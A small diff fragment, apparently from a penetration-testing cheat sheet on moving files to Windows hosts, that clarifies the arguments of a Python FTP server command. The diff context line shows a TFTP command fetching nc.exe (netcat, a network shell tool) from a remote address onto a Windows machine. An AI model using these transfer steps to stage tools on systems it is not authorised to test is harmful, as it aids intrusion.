@@ -17,7 +17,7 @@ Windows> tftp -i 192.168.30.45 GET nc.exe
 
 ```
 python3 -m pip install pyftpdlib  
-python3 -m pyftpdlib -p 21 -u root -P root
+python3 -m pyftpdlib -p 21 -u root(username) -P root(pass) -d path(current dir by default)
 ```
 
 ## on Windows
